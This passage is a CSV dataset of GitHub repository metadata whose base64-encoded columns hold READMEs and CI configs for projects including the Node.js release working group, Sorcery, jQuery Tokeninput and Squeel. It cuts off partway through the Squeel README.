name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
bi8KW0NhcmJvbl06IGh0dHBzOi8vbm9kZWpzLm9yZy9kb3dubG9hZC9yZWxl
YXNlL2xhdGVzdC1jYXJib24vCltEdWJuaXVtXTogaHR0cHM6Ly9ub2RlanMu
b3JnL2Rvd25sb2FkL3JlbGVhc2UvbGF0ZXN0LWR1Ym5pdW0vCltFcmJpdW1d
OiBodHRwczovL25vZGVqcy5vcmcvZG93bmxvYWQvcmVsZWFzZS9sYXRlc3Qt
ZXJiaXVtLwpbNC54XTogaHR0cHM6Ly9ub2RlanMub3JnL2Rvd25sb2FkL3Jl
bGVhc2UvbGF0ZXN0LXY0LngvCls1LnhdOiBodHRwczovL25vZGVqcy5vcmcv
ZG93bmxvYWQvcmVsZWFzZS9sYXRlc3QtdjUueC8KWzYueF06IGh0dHBzOi8v
bm9kZWpzLm9yZy9kb3dubG9hZC9yZWxlYXNlL2xhdGVzdC12Ni54LwpbNy54
XTogaHR0cHM6Ly9ub2RlanMub3JnL2Rvd25sb2FkL3JlbGVhc2UvbGF0ZXN0
LXY3LngvCls4LnhdOiBodHRwczovL25vZGVqcy5vcmcvZG93bmxvYWQvcmVs
ZWFzZS9sYXRlc3QtdjgueC8KWzkueF06IGh0dHBzOi8vbm9kZWpzLm9yZy9k
b3dubG9hZC9yZWxlYXNlL2xhdGVzdC12OS54LwpbMTAueF06IGh0dHBzOi8v
bm9kZWpzLm9yZy9kb3dubG9hZC9yZWxlYXNlL2xhdGVzdC12MTAueC8KWzEx
LnhdOiBodHRwczovL25vZGVqcy5vcmcvZG93bmxvYWQvcmVsZWFzZS9sYXRl
c3QtdjExLngvClsxMi54XTogaHR0cHM6Ly9ub2RlanMub3JnL2Rvd25sb2Fk
L3JlbGVhc2UvbGF0ZXN0LXYxMi54LwpbSlNPTl06IHNjaGVkdWxlLmpzb24K
ClRoZSB3b3JraW5nIGdyb3VwIG1lbWJlcnMgYXJlIHRoZSB1bmlvbiBvZiB0
aGUgTFRTLCBSZWxlYXNlcnMKYW5kIENJVEdNIHRlYW0gbWVtYmVycyBsaXN0
ZWQgYmVsb3cuCgojIyBMVFMgVGVhbSBtZW1iZXJzCgo8IS0tIG5jdS10ZWFt
LXN5bmMudGVhbShub2RlanMvbHRzKSAtLT4KCi0gW0BhZGRhbGVheF0oaHR0
cHM6Ly9naXRodWIuY29tL2FkZGFsZWF4KSAtIEFubmEgSGVubmluZ3Nlbgot
IFtAQmV0aEdyaWdnc10oaHR0cHM6Ly9naXRodWIuY29tL0JldGhHcmlnZ3Mp
IC0gQmV0aGFueSBOaWNvbGxlIEdyaWdncwotIFtAYm5vb3JkaHVpc10oaHR0
cHM6Ly9naXRodWIuY29tL2Jub29yZGh1aXMpIC0gQmVuIE5vb3JkaHVpcwot
IFtAY29kZWJ5dGVyZV0oaHR0cHM6Ly9naXRodWIuY29tL2NvZGVieXRlcmUp
IC0gU2hlbGxleSBWb2hyCi0gW0BFcmlzRFNdKGh0dHBzOi8vZ2l0aHViLmNv
bS9FcmlzRFMpIC0gSGFubmFoIFdvbGZlCi0gW0BGaXNocm9jazEyM10oaHR0
cHM6Ly9naXRodWIuY29tL0Zpc2hyb2NrMTIzKSAtIEplcmVtaWFoIFNlbmtw
aWVsCi0gW0BnZWVrXShodHRwczovL2dpdGh1Yi5jb20vZ2VlaykgLSBXeWF0
dCBQcmV1bAotIFtAZ2liZmFobl0oaHR0cHM6Ly9naXRodWIuY29tL2dpYmZh
aG4pIC0gR2lic29uIEZhaG5lc3RvY2sKLSBbQG1oZGF3c29uXShodHRwczov
L2dpdGh1Yi5jb20vbWhkYXdzb24pIC0gTWljaGFlbCBEYXdzb24KLSBbQE15
bGVzQm9yaW5zXShodHRwczovL2dpdGh1Yi5jb20vTXlsZXNCb3JpbnMpIC0g
TXlsZXMgQm9yaW5zCi0gW0BvdGhpeW0yM10oaHR0cHM6Ly9naXRodWIuY29t
L290aGl5bTIzKSAtIEZvcnJlc3QgTCBOb3J2ZWxsCi0gW0BzYW0tZ2l0aHVi
XShodHRwczovL2dpdGh1Yi5jb20vc2FtLWdpdGh1YikgLSBTYW0gUm9iZXJ0
cwotIFtAc2hpZ2VraV0oaHR0cHM6Ly9naXRodWIuY29tL3NoaWdla2kpIC0g
U2hpZ2VraSBPaHRzdQotIFtAc3JsMjk1XShodHRwczovL2dpdGh1Yi5jb20v
c3JsMjk1KSAtIFN0ZXZlbiBSLiBMb29taXMKLSBbQHRhcmdvc10oaHR0cHM6
Ly9naXRodWIuY29tL3RhcmdvcykgLSBNaWNoYcOrbCBaYXNzbwotIFtAdHJl
dm5vcnJpc10oaHR0cHM6Ly9naXRodWIuY29tL3RyZXZub3JyaXMpIC0gVHJl
dm9yIE5vcnJpcwotIFtAeXVub25nXShodHRwczovL2dpdGh1Yi5jb20veXVu
b25nKSAtIFl1bm9uZyBYaWFvCgo8IS0tIG5jdS10ZWFtLXN5bmMgZW5kIC0t
PgoKIyMjIEJhY2twb3J0ZXJzIHRlYW0KCjwhLS0gbmN1LXRlYW0tc3luYy50
ZWFtKG5vZGVqcy9iYWNrcG9ydGVycykgLS0+CgotIFtAYWRkYWxlYXhdKGh0
dHBzOi8vZ2l0aHViLmNvbS9hZGRhbGVheCkgLSBBbm5hIEhlbm5pbmdzZW4K
LSBbQEJldGhHcmlnZ3NdKGh0dHBzOi8vZ2l0aHViLmNvbS9CZXRoR3JpZ2dz
KSAtIEJldGhhbnkgTmljb2xsZSBHcmlnZ3MKLSBbQGNvZGVieXRlcmVdKGh0
dHBzOi8vZ2l0aHViLmNvbS9jb2RlYnl0ZXJlKSAtIFNoZWxsZXkgVm9ocgot
IFtAZ2liZmFobl0oaHR0cHM6Ly9naXRodWIuY29tL2dpYmZhaG4pIC0gR2li
c29uIEZhaG5lc3RvY2sKLSBbQG1oZGF3c29uXShodHRwczovL2dpdGh1Yi5j
b20vbWhkYXdzb24pIC0gTWljaGFlbCBEYXdzb24KLSBbQE15bGVzQm9yaW5z
XShodHRwczovL2dpdGh1Yi5jb20vTXlsZXNCb3JpbnMpIC0gTXlsZXMgQm9y
aW5zCi0gW0BzYW0tZ2l0aHViXShodHRwczovL2dpdGh1Yi5jb20vc2FtLWdp
dGh1YikgLSBTYW0gUm9iZXJ0cwoKPCEtLSBuY3UtdGVhbS1zeW5jIGVuZCAt
LT4KCiMjIyBSZWxlYXNlcnMgdGVhbQoKPCEtLSBuY3UtdGVhbS1zeW5jLnRl
YW0obm9kZWpzL3JlbGVhc2VycykgLS0+CgotIFtAQmV0aEdyaWdnc10oaHR0
cHM6Ly9naXRodWIuY29tL0JldGhHcmlnZ3MpIC0gQmV0aGFueSBOaWNvbGxl
IEdyaWdncwotIFtAQnJpZGdlQVJdKGh0dHBzOi8vZ2l0aHViLmNvbS9Ccmlk
Z2VBUikgLSBSdWJlbiBCcmlkZ2V3YXRlcgotIFtAY2ppaHJpZ10oaHR0cHM6
Ly9naXRodWIuY29tL2NqaWhyaWcpIC0gQ29saW4gSWhyaWcKLSBbQGNvZGVi
eXRlcmVdKGh0dHBzOi8vZ2l0aHViLmNvbS9jb2RlYnl0ZXJlKSAtIFNoZWxs
ZXkgVm9ocgotIFtAZXZhbmx1Y2FzXShodHRwczovL2dpdGh1Yi5jb20vZXZh
bmx1Y2FzKSAtIEV2YW4gTHVjYXMKLSBbQEZpc2hyb2NrMTIzXShodHRwczov
L2dpdGh1Yi5jb20vRmlzaHJvY2sxMjMpIC0gSmVyZW1pYWggU2Vua3BpZWwK
LSBbQGdpYmZhaG5dKGh0dHBzOi8vZ2l0aHViLmNvbS9naWJmYWhuKSAtIEdp
YnNvbiBGYWhuZXN0b2NrCi0gW0BqYXNuZWxsXShodHRwczovL2dpdGh1Yi5j
b20vamFzbmVsbCkgLSBKYW1lcyBNIFNuZWxsCi0gW0BNeWxlc0Jvcmluc10o
aHR0cHM6Ly9naXRodWIuY29tL015bGVzQm9yaW5zKSAtIE15bGVzIEJvcmlu
cwotIFtAdGFyZ29zXShodHRwczovL2dpdGh1Yi5jb20vdGFyZ29zKSAtIE1p
Y2hhw6tsIFphc3NvCgo8IS0tIG5jdS10ZWFtLXN5bmMgZW5kIC0tPgoKIyMj
IENJVEdNIHRlYW0KCjwhLS0gbmN1LXRlYW0tc3luYy50ZWFtKG5vZGVqcy9j
aXRnbSkgLS0+CgotIFtAYWwtazIxXShodHRwczovL2dpdGh1Yi5jb20vYWwt
azIxKSAtIE9sZWtzYW5kciBLdXNoY2hhawotIFtAYmVuZ2xdKGh0dHBzOi8v
Z2l0aHViLmNvbS9iZW5nbCkgLSBCcnlhbiBFbmdsaXNoCi0gW0BCcmlkZ2VB
Ul0oaHR0cHM6Ly9naXRodWIuY29tL0JyaWRnZUFSKSAtIFJ1YmVuIEJyaWRn
ZXdhdGVyCi0gW0Biem96XShodHRwczovL2dpdGh1Yi5jb20vYnpveikgLSBC
YXJ0b3N6IFNvc25vd3NraQotIFtAZ2RhbXNdKGh0dHBzOi8vZ2l0aHViLmNv
bS9nZGFtcykgLSBHZW9yZ2UgQWRhbXMKLSBbQGdpYmZhaG5dKGh0dHBzOi8v
Z2l0aHViLmNvbS9naWJmYWhuKSAtIEdpYnNvbiBGYWhuZXN0b2NrCi0gW0BN
eWxlc0Jvcmluc10oaHR0cHM6Ly9naXRodWIuY29tL015bGVzQm9yaW5zKSAt
IE15bGVzIEJvcmlucwotIFtAcmljaGFyZGxhdV0oaHR0cHM6Ly9naXRodWIu
Y29tL3JpY2hhcmRsYXUpIC0gUmljaGFyZCBMYXUKLSBbQHRhcmdvc10oaHR0
cHM6Ly9naXRodWIuY29tL3RhcmdvcykgLSBNaWNoYcOrbCBaYXNzbwoKPCEt
LSBuY3UtdGVhbS1zeW5jIGVuZCAtLT4KCiMjIyBFbWVyaXR1cwoKIyMjIyBM
VFMgdGVhbQotIFtAamFzbmVsbF0oaHR0cHM6Ly9naXRodWIuY29tL2phc25l
bGwpIC0gSmFtZXMgTSBTbmVsbAotIFtAcnZhZ2ddKGh0dHBzOi8vZ2l0aHVi
LmNvbS9ydmFnZykgLSBSb2QgVmFnZwoKIyMjIyBSZWxlYXNlcnMgdGVhbQot
IFtAcnZhZ2ddKGh0dHBzOi8vZ2l0aHViLmNvbS9ydmFnZykgLSBSb2QgVmFn
ZwoKIyMjIyBDSVRHTSB0ZWFtCi0gW0BqYXNuZWxsXShodHRwczovL2dpdGh1
Yi5jb20vamFzbmVsbCkgLSBKYW1lcyBNIFNuZWxsCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'sorcery',1307476,b'Magical authentication for Rails 3 & 4',b'Ruby',78,2391,,2391,False,b'https://api.github.com/repos/NoamB/sorcery/forks',"IyMgU29yY2VyeSBoYXMgbW92ZWQhCgpZb3UgY2FuIGZpbmQgc29yY2VyeSBh
dCBpdCdzIG5ldyBob21lOiBbU29yY2VyeS9zb3JjZXJ5XShodHRwczovL2dp
dGh1Yi5jb20vU29yY2VyeS9zb3JjZXJ5KQo=
",,"bGFuZ3VhZ2U6IHJ1YnkKcnZtOgogIC0ganJ1YnkKICAtIDIuMC4wCiAgLSAy
LjEKICAtIDIuMgogIC0gMi4zLjAKCmVudjoKICBnbG9iYWw6CiAgICAtIEpS
VUJZX09QVFM9Ii0tMi4wIgoKZ2VtZmlsZToKICAtIEdlbWZpbGUKICAtIGdl
bWZpbGVzL2FjdGl2ZV9yZWNvcmQtcmFpbHM0MC5nZW1maWxlCiAgLSBnZW1m
aWxlcy9hY3RpdmVfcmVjb3JkLXJhaWxzNDEuZ2VtZmlsZQogIC0gZ2VtZmls
ZXMvYWN0aXZlX3JlY29yZC1yYWlsczQyLmdlbWZpbGUKCmJlZm9yZV9zY3Jp
cHQ6CiAgLSBteXNxbCAtZSAnY3JlYXRlIGRhdGFiYXNlIHNvcmNlcnlfdGVz
dDsnCgpiZWZvcmVfaW5zdGFsbDoKICAtIHJ2bSBnZXQgc3RhYmxlIC0tYXV0
by1kb3RmaWxlcwogIC0gZ2VtIHVwZGF0ZSBidW5kbGVyCgptYXRyaXg6CiAg
YWxsb3dfZmFpbHVyZXM6CiAgICAtIHJ2bToganJ1YnkKCiAgZXhjbHVkZToK
ICAgIC0gcnZtOiAyLjAuMAogICAgICBnZW1maWxlOiBnZW1maWxlcy9hY3Rp
dmVfcmVjb3JkLXJhaWxzNDIuZ2VtZmlsZQoKICAgIC0gcnZtOiBqcnVieQog
ICAgICBnZW1maWxlOiBHZW1maWxlCgogICAgLSBydm06IDIuMgogICAgICBn
ZW1maWxlOiBnZW1maWxlcy9hY3RpdmVfcmVjb3JkLXJhaWxzNDAuZ2VtZmls
ZQoKICAgIC0gcnZtOiAyLjMuMAogICAgICBnZW1maWxlOiBnZW1maWxlcy9h
Y3RpdmVfcmVjb3JkLXJhaWxzNDAuZ2VtZmlsZQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'jquery-tokeninput',248959,"b'Tokeninput is a jQuery plugin which allows your users to select multiple items from a predefined list, using autocompletion as they type to find each item. You may have seen a similar type of text entry when filling in the recipients field sending messages on facebook.'",b'JavaScript',551,2391,,2391,False,b'https://api.github.com/repos/loopj/jquery-tokeninput/forks',"alF1ZXJ5IFRva2VuaW5wdXQ6IEEgVG9rZW5pemluZyBBdXRvY29tcGxldGUg
VGV4dCBFbnRyeQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09CgpPdmVydmlldwotLS0tLS0tLQpUb2tl
bmlucHV0IGlzIGEgalF1ZXJ5IHBsdWdpbiB3aGljaCBhbGxvd3MgeW91ciB1
c2VycyB0byBzZWxlY3QgbXVsdGlwbGUgaXRlbXMgZnJvbSBhIHByZWRlZmlu
ZWQgbGlzdCwgdXNpbmcgYXV0b2NvbXBsZXRpb24gYXMgdGhleSB0eXBlIHRv
IGZpbmQgZWFjaCBpdGVtLiBZb3UgbWF5IGhhdmUgc2VlbiBhIHNpbWlsYXIg
dHlwZSBvZiB0ZXh0IGVudHJ5IHdoZW4gZmlsbGluZyBpbiB0aGUgcmVjaXBp
ZW50cyBmaWVsZCBzZW5kaW5nIG1lc3NhZ2VzIG9uIGZhY2Vib29rLgoKRG9j
dW1lbnRhdGlvbiwgRmVhdHVyZXMgYW5kIERlbW9zCi0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLQpGdWxsIGRldGFpbHMgYW5kIGRvY3VtZW50
YXRpb24gY2FuIGJlIGZvdW5kIG9uIHRoZSBwcm9qZWN0IHBhZ2UgaGVyZToK
CjxodHRwOi8vbG9vcGouY29tL2pxdWVyeS10b2tlbmlucHV0Lz4=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'squeel',1591828,"b'Active Record, improved. Live again :)'",b'Ruby',87,2390,,2390,False,b'https://api.github.com/repos/activerecord-hackery/squeel/forks',"IyBTcXVlZWwgWyFbQnVpbGQgU3RhdHVzXShodHRwczovL3NlY3VyZS50cmF2
aXMtY2kub3JnL2FjdGl2ZXJlY29yZC1oYWNrZXJ5L3NxdWVlbC5wbmcpXSho
dHRwOi8vdHJhdmlzLWNpLm9yZy9hY3RpdmVyZWNvcmQtaGFja2VyeS9zcXVl
ZWwpIFshW2VuZG9yc2VdKGh0dHA6Ly9hcGkuY29kZXJ3YWxsLmNvbS9lcm5p
ZS9lbmRvcnNlY291bnQucG5nKV0oaHR0cDovL2NvZGVyd2FsbC5jb20vZXJu
aWUpCgpTcXVlZWwgbGV0cyB5b3Ugd3JpdGUgeW91ciBBY3RpdmUgUmVjb3Jk
IHF1ZXJpZXMgd2l0aCBmZXdlciBzdHJpbmdzLCBhbmQgbW9yZSBSdWJ5LApi
eSBtYWtpbmcgdGhlIEFyZWwgYXdlc29tZW5lc3MgdGhhdCBsaWVzIGJlbmVh
dGggQWN0aXZlIFJlY29yZCBtb3JlIGFjY2Vzc2libGUuCgpTcXVlZWwgbGV0
cyB5b3UgcmV3cml0ZS4uLgoKYGBgcnVieQpBcnRpY2xlLndoZXJlIFsnY3Jl
YXRlZF9hdCA+PSA/JywgMi53ZWVrcy5hZ29dCmBgYAoKLi4uYXMuLi4KCmBg
YHJ1YnkKQXJ0aWNsZS53aGVyZXtjcmVhdGVkX2F0ID49IDIud2Vla3MuYWdv
fQpgYGAKClRoaXMgaXMgYSBfZ29vZCB0aGluZ18uIElmIHlvdSBkb24ndCBh
Z3JlZSwgU3F1ZWVsIG1pZ2h0IG5vdCBiZSBmb3IgeW91LiBUaGUgYWJvdmUg
aXMKanVzdCBhIHNpbXBsZSBleGFtcGxlIC0tIFNxdWVlbCdzIGNhcGFibGUg
b2YgYSB3aG9sZSBsb3QgbW9yZS4gS2VlcCByZWFkaW5nLgoKIyMgR2V0dGlu
ZyBzdGFydGVkCgpJbiB5b3VyIEdlbWZpbGU6CgpgYGBydWJ5CmdlbSAic3F1
ZWVsIiAgIyBMYXN0IG9mZmljaWFsbHkgcmVsZWFzZWQgZ2VtCiMgZ2VtICJz
cXVlZWwiLCA6Z2l0ID0+ICJnaXQ6Ly9naXRodWIuY29tL2FjdGl2ZXJlY29y
ZC1oYWNrZXJ5L3NxdWVlbC5naXQiICMgVHJhY2sgZ2l0IHJlcG8KYGBgCgpU
aGVuIGJ1bmRsZSBhcyB1c3VhbC4KCklmIHlvdSdkIGxpa2UgdG8gY3VzdG9t
aXplIFNxdWVlbCdzIGZ1bmN0aW9uYWxpdHkgYnkgZW5hYmxpbmcgY29yZQpl
eHRlbnNpb25zIGZvciBoYXNoZXMgb3Igc3ltYm9scywgb3IgYWxpYXNpbmcg
c29tZSBwcmVkaWNhdGVzLCB5b3UgY2FuCmNyZWF0ZSBhIHNhbXBsZSBpbml0
aWFsaXplciB3aXRoOgoKYGBgc2gKJCByYWlscyBnIHNxdWVlbDppbml0aWFs
aXplcgpgYGAKCiMjIFRoZSBTcXVlZWwgUXVlcnkgRFNMCgpTcXVlZWwgZW5o
YW5jZXMgdGhlIG5vcm1hbCBBY3RpdmUgUmVjb3JkIHF1ZXJ5IG1ldGhvZHMg
YnkgZW5hYmxpbmcgdGhlbSB0byBhY2NlcHQKYmxvY2tzLiBJbnNpZGUgYSBi
bG9jaywgdGhlIFNxdWVlbCBxdWVyeSBEU0wgY2FuIGJlIHVzZWQuIE5vdGUg
dGhlIHVzZSBvZiBjdXJseSBicmFjZXMKaW4gdGhlc2UgZXhhbXBsZXMgaW5z
dGVhZCBvZiBwYXJlbnRoZXNlcy4gYHt9YCBkZW5vdGVzIGEgU3F1ZWVsIERT
TCBxdWVyeS4KClN0dWJzIGFuZCBrZXlwYXRocyBhcmUgdGhlIHR3byBwcmlt
YXJ5IGJ1aWxkaW5nIGJsb2NrcyB1c2VkIGluIGEgU3F1ZWVsIERTTCBxdWVy
eSwgc28gd2UnbGwKc3RhcnQgYnkgdGFraW5nIGEgbG9vayBhdCB0aGVtLiBN
b3N0IG9mIHRoZSBvdGhlciBleGFtcGxlcyB0aGF0IGZvbGxvdyB3aWxsIGJl
IGJhc2VkIG9uCnRoaXMgInN5bWJvbC1sZXNzIiBibG9jayBzeW50YXguCgoq
KkFuIGltcG9ydGFudCBnb3RjaGEsIGJlZm9yZSB3ZSBiZWdpbjoqKiBUaGUg
U3F1ZWVsIERTTCB3b3JrcyBpdHMgbWFnaWMgdXNpbmcgYGluc3RhbmNlX2V2
YWxgLgpJZiB5b3UndmUgYmVlbiB3b3JraW5nIHdpdGggUnVieSBmb3IgYSB3
aGlsZSwgeW91J2xsIGtub3cgaW1tZWRpYXRlbHkgdGhhdCB0aGlzIG1lYW5z
IHRoYXQKX2luc2lkZV8gYSBTcXVlZWwgRFNMIGJsb2NrLCBgc2VsZmAgaXNu
J3QgdGhlIHNhbWUgdGhpbmcgdGhhdCBpdCBpcyBfb3V0c2lkZV8gdGhlIGJs
b2NrLgoKVGhpcyBjYXJyaWVzIHdpdGggaXQgYW4gaW1wb3J0YW50IGltcGxp
Y2F0aW9uOiA8c3Ryb25nPkluc3RhbmNlIHZhcmlhYmxlcyBhbmQgaW5zdGFu
Y2UgbWV0aG9kcwppbnNpZGUgdGhlIGJsb2NrIHdvbid0IHJlZmVyIHRvIHlv
dXIgb2JqZWN0J3MgdmFyaWFibGVzL21ldGhvZHMuPC9zdHJvbmc+CgpEb24n
dCB3b3JyeSwgU3F1ZWVsJ3MgZ290IHlvdSBjb3ZlcmVkLiBVc2Ugb25lIG9m
IHRoZSBmb2xsb3dpbmcgbWV0aG9kcyB0byBnZXQgYWNjZXNzCnRvIHlvdXIg
b2JqZWN0J3MgbWV0aG9kcyBhbmQgdmFyaWFibGVzOgoKICAxLiBBc3NpZ24g
dGhlIHZhcmlhYmxlIGxvY2FsbHkgYmVmb3JlIHRoZSBEU0wgYmxvY2ssIGFu
ZCBhY2Nlc3MgaXQgYXMgeW91IHdvdWxkCiAgICAgbm9ybWFsbHkuCiAgMi4g
U3VwcGx5IGFuIGFyaXR5IHRvIHRoZSBEU0wgYmxvY2ssIGFzIGluIGBQZXJz
b24ud2hlcmV7fHF8IHEubmFtZSA9PSBAbXlfbmFtZX1gCiAgICAgRG93bnNp
ZGU6IFlvdSdsbCBuZWVkIHRvIHByZWZpeCBzdHVicywga2V5cGF0aHMsIGFu
ZCBmdW5jdGlvbnMgKGV4cGxhaW5lZCBiZWxvdykKICAgICB3aXRoIHRoZSBE
U0wgb2JqZWN0LgogIDMuIFdyYXAgdGhlIG1ldGhvZCBvciBpbnN0YW5jZSB2
YXJpYWJsZSBpbnNpZGUgdGhlIGJsb2NrIHdpdGggYG15e31gLgogICAgIGBQ
ZXJzb24ud2hlcmV7bmFtZSA9PSBteXtzb21lX21ldGhvZF90b19yZXR1cm5f
YV9uYW1lfX1gCgojIyMgU3R1YnMKClN0dWJzIGFyZSwgZm9yIG1vc3QgaW50
ZW50cyBhbmQgcHVycG9zZXMsIGp1c3QgbGlrZSBTeW1ib2xzIGluIGEgbm9y
bWFsIGNhbGwgdG8KYFJlbGF0aW9uI3doZXJlYCAobm90ZSB0aGUgbmVlZCBm
b3IgZG91YmxpbmcgdXAgb24gdGhlIGN1cmx5IGJyYWNlcyBoZXJlLCB0aGUg
Zmlyc3Qgb25lcwpzdGFydCB0aGUgYmxvY2ssIHRoZSBzZWNvbmQgYXJlIHRo
ZSBoYXNoIGJyYWNlcyk6CgpgYGBydWJ5ClBlcnNvbi53aGVyZXt7bmFtZSA9
PiAnRXJuaWUnfX0KIyA9PiBTRUxFQ1QgInBlb3BsZSIuKiBGUk9NICJwZW9w
bGUiICBXSEVSRSAicGVvcGxlIi4ibmFtZSIgPSAnRXJuaWUnCmBgYAoKWW91
IG5vcm1hbGx5IHdvdWxkbid0IGJvdGhlciB1c2luZyB0aGUgRFNMIGluIHRo
aXMgY2FzZSwgYXMgYSBzaW1wbGUgaGFzaCB3b3VsZApzdWZmaWNlLiBIb3dl
dmVyLCBzdHVicyBzZXJ2ZSBhcyBhIGJ1aWxkaW5nIGJsb2NrIGZvciBrZXlw
YXRocywgYW5kIGtleXBhdGhzIGFyZQp2ZXJ5IGhhbmR5LgoKIyMjIEtleVBh
dGhzCgpBIFNxdWVlbCBrZXlwYXRoIGlzIGVzc2VudGlhbGx5IGEgbW9yZSBj
b25jaXNlIGFuZCByZWFkYWJsZSBhbHRlcm5hdGl2ZSB0byBhCmRlZXBseSBu
ZXN0ZWQgaGFzaC4gRm9yIGluc3RhbmNlLCBpbiBzdGFuZGFyZCBBY3RpdmUg
UmVjb3JkLCB5b3UgbWlnaHQgam9pbiBzZXZlcmFsCmFzc29jaWF0aW9ucyBs
aWtlIHRoaXMgdG8gcGVyZm9ybSBhIHF1ZXJ5OgoKYGBgcnVieQpQZXJzb24u
am9pbnMoOmFydGljbGVzID0+IHs6Y29tbWVudHMgPT4gOnBlcnNvbn0pCiMg
PT4gU0VMRUNUICJwZW9wbGUiLiogRlJPTSAicGVvcGxlIgojICAgIElOTkVS
IEpPSU4gImFydGljbGVzIiBPTiAiYXJ0aWNsZXMiLiJwZXJzb25faWQiID0g
InBlb3BsZSIuImlkIgojICAgIElOTkVSIEpPSU4gImNvbW1lbnRzIiBPTiAi
Y29tbWVudHMiLiJhcnRpY2xlX2lkIiA9ICJhcnRpY2xlcyIuImlkIgojICAg
IElOTkVSIEpPSU4gInBlb3BsZSIgInBlb3BsZV9jb21tZW50cyIgT04gInBl
b3BsZV9jb21tZW50cyIuImlkIiA9ICJjb21tZW50cyIuInBlcnNvbl9pZCIK
YGBgCgpXaXRoIGEga2V5cGF0aCwgdGhpcyB3b3VsZCBsb29rIGxpa2U6Cgpg
YGBydWJ5ClBlcnNvbi5qb2luc3thcnRpY2xlcy5jb21tZW50cy5wZXJzb259
